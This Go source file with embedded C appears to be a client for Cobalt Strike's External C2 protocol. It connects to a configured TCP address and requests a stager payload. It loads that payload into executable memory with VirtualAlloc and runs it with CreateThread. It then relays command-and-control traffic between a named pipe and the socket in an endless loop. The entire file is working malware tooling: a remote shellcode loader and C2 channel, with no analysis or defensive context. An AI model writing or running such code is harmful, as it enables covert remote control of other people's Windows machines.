package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"runtime"
	"time"

	"github.com/Microsoft/go-winio"

	"unsafe"
)

/*
#include <windows.h>
void invokeDLL(uintptr_t p, int len) {
    LPVOID payload = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (payload == NULL) {
        return;
    }
    memcpy(payload, (void*)p, len);

    HANDLE threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    if (threadHandle == NULL) {
        return;
    }
    CloseHandle(threadHandle);
}
*/
import "C"

var pipeName = `foobar`
var address = `127.0.0.1:8080`

const headerSize = 4
const maxSize = 1024 * 1024

type Channel struct {
	Socket net.Conn
	Pipe   net.Conn
}

// InvokeDLL 调用 DLL 函数
func InvokeDLL(p []byte) {
	C.invokeDLL((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}

func (s *Channel) ReadFrame() ([]byte, int, error) {
	sizeBytes := [headerSize]byte{}
	if _, err := io.ReadFull(s.Socket, sizeBytes[:]); err != nil {
		return nil, 0, err
	}
	size := int(binary.LittleEndian.Uint32(sizeBytes[:]))
	if size > maxSize {
		size = maxSize
	}

	buff := make([]byte, size)
	bytesRead, err := io.ReadFull(s.Socket, buff)
	if err != nil {
		return nil, bytesRead, err
	}
	return buff, bytesRead, nil
}

func (s *Channel) SendFrame(buffer []byte) (int, error) {
	length := len(buffer)
	sizeBytes := [headerSize]byte{}
	binary.LittleEndian.PutUint32(sizeBytes[:], uint32(length))
	bytesWritten, err := s.Socket.Write(sizeBytes[:])
	if err != nil {
		return bytesWritten, err
	}
	n, err := s.Socket.Write(buffer)
	return bytesWritten + n, err
}

func (s *Channel) GetStager() []byte {
	taskWaitTime := 100
	osVersion := "arch=x86"
	if runtime.GOARCH == "amd64" {
		osVersion = "arch=x64"
	}
	s.SendFrame([]byte(osVersion))
	s.SendFrame([]byte("pipename=" + pipeName))
	s.SendFrame([]byte(fmt.Sprintf("block=%d", taskWaitTime)))
	s.SendFrame([]byte("go"))
	stager, _, err := s.ReadFrame()
	if err != nil {
		return nil
	}
	return stager
}

func (c *Channel) ReadPipe() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	_, err := c.Pipe.Read(sizeBytes)
	if err != nil {
		return nil, 0, err
	}
	size := int(binary.LittleEndian.Uint32(sizeBytes))
	if size > maxSize {
		size = maxSize
	}
	buff := make([]byte, size)
	totalRead := 0
	for totalRead < size {
		read, err := c.Pipe.Read(buff[totalRead:])
		if err != nil {
			return nil, totalRead, err
		}
		totalRead += read
	}
	return buff, totalRead, nil
}

func (c *Channel) WritePipe(buffer []byte) (int, error) {
	length := len(buffer)
	sizeBytes := [headerSize]byte{}
	binary.LittleEndian.PutUint32(sizeBytes[:], uint32(length))
	bytesWritten, err := c.Pipe.Write(sizeBytes[:])
	if err != nil {
		return bytesWritten, err
	}
	n, err := c.Pipe.Write(buffer)
	return bytesWritten + n, err
}

func main() {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return
	}
	socketChannel := &Channel{
		Socket: conn,
	}
	stager := socketChannel.GetStager()
	if stager == nil {
		return
	}
	InvokeDLL(stager)
	time.Sleep(3 * time.Second)
	client, err := winio.DialPipe(`\\.\pipe\`+pipeName, nil)
	if err != nil {
		return
	}
	defer client.Close()
	pipeChannel := &Channel{
		Pipe: client,
	}
	for {
		time.Sleep(1 * time.Second)
		n, _, err := pipeChannel.ReadPipe()
		if err != nil {
			continue
		}
		_, err = socketChannel.SendFrame(n)
		if err != nil {
			continue
		}
		z, _, err := socketChannel.ReadFrame()
		if err != nil {
			continue
		}
		_, err = pipeChannel.WritePipe(z)
		if err != nil {
			continue
		}
	}
}
